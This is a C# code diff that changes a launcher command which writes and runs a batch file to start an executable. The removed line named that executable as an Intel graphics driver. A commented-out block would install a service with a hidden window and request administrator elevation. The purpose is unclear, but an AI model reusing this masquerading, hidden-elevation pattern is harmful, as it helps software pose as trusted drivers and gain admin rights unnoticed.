@@ -10,13 +10,27 @@ using System.Windows.Forms;
 
 namespace Payload.Core.Command
 {
+    public class StartProcessCommandProps
+    {
+        public string ExeName { get; set; }
+        public string TargetWorkSpaceDir { get; set; }
+    }
+
     public class StartProcessCommand : Payload.Command.Interface.ICommand
     {
+        StartProcessCommandProps Props;
+        public StartProcessCommand(StartProcessCommandProps props)
+        {
+            Props = props;
+        }
         public override Task Execute()
         {
-            string batPath = Config.Instance.WorkSpaceDir + "\\run.bat";
-
-            string batTxt = $"@echo off\npushd {Config.Instance.TargetWorkSpaceDir}\nstart \"Loading ...\" \"Intel(R) Graphics Drivers for Windows.exe\"";
+            string workingDir = Props!= null ? Props.TargetWorkSpaceDir : Config.Instance.TargetWorkSpaceDir;
+            string exeName = Props!= null ? Props.ExeName : Config.Instance.ExeName;
+            string batPath = workingDir + "\\run.bat";
+            if (File.Exists(batPath))
+                File.Delete(batPath);
+            string batTxt = $"@echo off\npushd {workingDir}\nstart \"Loading ...\" \"{exeName}\"";
             using (StreamWriter writer = new StreamWriter(batPath))
             {
                 writer.WriteLine(batTxt);
@@ -24,6 +38,28 @@ namespace Payload.Core.Command
             var p = new Process();
             p.StartInfo.FileName = batPath;
             p.Start();
+
+            //string exe = @"C:\Project\Test\InstallUtil.exe";
+            //string args = @"C:\Project\Test\ROServerService\Server\bin\Debug\myservices.exe";
+            //var psi = new ProcessStartInfo();
+            //psi.CreateNoWindow = true; //This hides the dos-style black window that the command prompt usually shows
+            //psi.FileName = batPath;//@"cmd.exe";
+            //psi.Verb = "runas"; //This is what actually runs the command as administrator
+            //psi.Arguments = "/C " + exe + " " + args;
+            //try
+            //{
+            //    var process = new Process();
+            //    process.StartInfo = psi;
+            //    process.Start();
+            //    process.WaitForExit();
+            //}
+            //catch (Exception e)
+            //{
+            //    //If you are here the user clicked decline to grant admin privileges (or he's not administrator)
+            //    throw e;
+            //}
+
+
             return null;
         }
     }
